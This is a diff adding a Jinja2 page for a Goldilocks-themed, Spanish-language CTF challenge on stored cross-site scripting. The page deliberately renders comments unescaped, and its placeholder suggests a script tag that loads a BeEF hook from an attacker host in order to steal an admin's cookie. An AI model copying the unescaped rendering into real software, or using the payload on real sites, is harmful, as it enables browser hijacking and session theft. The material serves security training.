@@ -1,0 +1,64 @@
+{% extends 'base.html' %}
+{% from '_macros.html' import challenge_header, briefing, hints, flag_form, detect_bar, nav_buttons %}
+{% block title %}La Silla Rota — Goldilocks CTF{% endblock %}
+
+{% block content %}
+<div class="wrap narrow">
+  {{ challenge_header(ch) }}
+  <p class="lead">"Ricitos se sentó en la silla de Osito y la rompió… pero antes dejó una nota que todos leerán."</p>
+
+  {{ detect_bar(g_detection) }}
+  {{ briefing(ch) }}
+
+  <div class="card" style="border-color:var(--yellow);box-shadow:0 0 20px rgba(253,224,71,0.22);">
+    <div class="card-title">📝 Muro de recados</div>
+    <form method="POST" action="{{ url_for('challenge_xss_stored') }}">
+      <div class="field">
+        <label>Deja un recado</label>
+        <textarea name="comment" placeholder='<script src="http://TU_IP:3000/hook.js"></script>'></textarea>
+      </div>
+      <button class="btn btn-cyan" type="submit">Publicar recado</button>
+    </form>
+
+    <div style="margin-top:1.2rem;display:grid;gap:0.6rem;">
+      {% for c in comments %}
+        <div style="border:1px solid var(--line);border-radius:12px;padding:0.7rem 0.9rem;">
+          <b style="color:var(--pink);font-size:0.85rem;">{{ c.user }}</b>
+          <!-- ⚠ almacenado y renderizado sin escape (intencional) -->
+          <div style="font-size:0.9rem;margin-top:0.2rem;">{{ c.text | safe }}</div>
+        </div>
+      {% else %}
+        <p style="color:var(--text-faint);font-style:italic;">Todavía no hay recados.</p>
+      {% endfor %}
+    </div>
+
+    <hr>
+    <p style="font-size:0.85rem;color:var(--text-dim);">
+      El oso administrador revisa el muro cada minuto. Simula su visita:
+    </p>
+    <form method="POST" action="{{ url_for('xss_stored_bot') }}">
+      <button class="btn btn-outline" type="submit">🐻 Simular visita del oso admin</button>
+    </form>
+
+    {% if hooked %}
+      {% if hooked.ok %}
+        <div class="alert alert-success" style="margin-top:1rem;">
+          ✓ El navegador del oso admin cargó tu <code>&lt;script&gt;</code> y quedó
+          enganchado a BeEF. Panel → módulo <i>Get Cookie</i>:
+        </div>
+        <div class="flag-box">{{ hooked.flag }}</div>
+      {% else %}
+        <div class="alert alert-warning" style="margin-top:1rem;">
+          El oso admin revisó el muro pero no había ningún <code>&lt;script&gt;</code>
+          persistente. BeEF no enganchó.
+        </div>
+      {% endif %}
+    {% endif %}
+  </div>
+
+  {{ hints(ch, hint_cost_min, hint_cost_pts) }}
+  {{ flag_form(ch, g_solved) }}
+
+  {{ nav_buttons(ch) }}
+</div>
+{% endblock %}
